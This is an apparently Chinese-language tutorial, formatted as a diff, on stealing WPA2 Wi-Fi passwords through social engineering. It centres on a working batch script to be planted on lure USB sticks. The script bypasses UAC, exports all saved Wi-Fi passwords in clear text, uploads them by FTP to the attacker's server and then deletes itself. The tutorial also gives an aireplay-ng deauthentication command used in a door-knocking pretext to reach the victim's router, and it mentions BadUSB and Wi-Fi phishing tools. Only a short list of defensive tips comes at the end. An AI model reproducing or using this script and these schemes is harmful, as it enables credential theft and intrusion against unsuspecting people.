@@ -1,0 +1,111 @@
+何为社工？社工是一种通过利用受害者心理弱点，如本能反应、好奇心、同情心、信任、贪婪等进行诸如欺骗、盗取、控制等非法手段的一种攻击方式。在无线安全中也可以利用社工做到许多非法操作。下面举几个利用社工盗取wpa2密码的例子：
+0×01 移动存储攻击
+某宝小容量u盘，在u盘中存放一个bat批处理文件，并命名为诱使人点开的标题，如：windows电脑优化、私人照片等等。其实bat文件的内容是这个：
+@echo off
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+if '%errorlevel%' NEQ '0' (
+goto UACPrompt
+) else ( goto gotAdmin )
+:UACPrompt
+echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
+"%temp%\getadmin.vbs"
+exit /B
+:gotAdmin
+if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
+md c:\win
+netsh wlan export profile key=clear folder=c:\win
+echo open 服务器ip>C:\config.txt
+echo user 账号>>C:\config.txt
+echo 密码>>C:\config.txt
+echo mput c:\win\*.xml>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo yes>>C:\config.txt
+echo bye>>C:\config.txt
+ftp -n -s:"C:\config.txt"
+del C:\config.txt
+del C:\win\*.xml
+del %0
+这个bat脚本会读取本机连接过的wifi信息（包括密码）打包到一个文件夹里并全部put到服务器上，然后删除痕迹和自身防止服务器信息泄露。最后攻击者就可以在自己的ftp服务器里挑选自己中意的wifi了。
+攻击演示：
+打开此脚本image.png
+弹出cmd界面，1秒后消失（太快了不好截），bat脚本也随之消失
+查看ftp服务器image.png
+wifi信息已经put上来了
+进入服务器打开一个xml文件image.png
+就拿到了密码
+可以自己在里面添加功能使社工效果更好，例如脚本名称命名为某某公司有奖问卷调查，并添加打开调查问卷的命令，使攻击神不知鬼不觉。
+若攻击者将脚本拷入多个U盘后广泛撒网，就可以获得该城市的大量wifi信息，影响极大。
+0×02 直接接触受害者
+1.使用Deauthentication攻击
+aireplay-ng –deauth 10000 -a xx:xx:xx:xx:xx:xx -c xx:xx:xx:xx:xx:xx mon0
+在下班休息的时候（这个时候普遍在使用网络）对受害者使用断网攻击，等一小时后去敲门，询问网络是否故障，询问网络是哪家公司配置的，然后声称自己的网络也故障了，是一样的公司，然后询问报修电话并拨打，其实拨打的是其他人或根本没有拨打，然后假装是保修人员提示让自己重启路由器，攻击者就可以接触到受害者路由器，运气好的话路由器背面有pin码，就可以撤退了。如果没有，攻击者就进一步施压，假装被保修人员提示打开路由器管理界面在管理界面重启路由器，乘机看到密码。重启完毕后手机ssh连接kali停止攻击，造成重启成功修复网络的假象，然后撤退。
+2.结合移动存储攻击，配合badusb，谎称有重要文件需要发送然而手机没电了，家里人还没下班。第一天进公司不想留下坏印象，从而直接接触受害者电脑，插入badusb，执行bat脚本或木马
+3.谎称自己是某某公司或某某大学的，正在进行网民安全意识的问卷调查，并将其中带有提问wifi密码的问卷递交受害者，从而获得wifi密码
+0×03 wifi钓鱼
+利用fluxion、wifiphisher等工具实施钓鱼攻击：
+    https://github.com/FluxionNetwork/fluxion
+    https://github.com/sophron/wifiphisher       ——项目地址
+它们的大概原理是抓取受害者客户端与wifi的握手包，对目标客户端实施wifi拒绝服务攻击，发送大量解离包，然后伪造一个相同名称的ap，受害者连接伪造的ap后会被解析到这个页面：
+image.png
+受害者输入密码后会自动与抓取的握手包进行比对，若正确，则停止拒绝服务攻击。网上有很多wifi钓鱼的教程，这里就不再阐述。
+0×04 防御措施
+    1.绑定mac地址，设置白名单，只允许自己的机器连接wifi
+    2.隐藏wifi广播，避免自己成为目标
+    3.不要插入来路不明的u盘，不要打开来路不明的程序，不要连接来路不明的无线信号
+    4.尽量不让陌生人接触到自己的设备
+    5.wifi最好使用wpa2加密，并使密码复杂度越高越好，尽量别在密码里使用和自己有关的信息
+    6.定期更换路由器管理界面密码和wifi密码
+    7.最好关闭路由器上的wps功能
+    8.尽量不使用wifi万能钥匙等类似软件
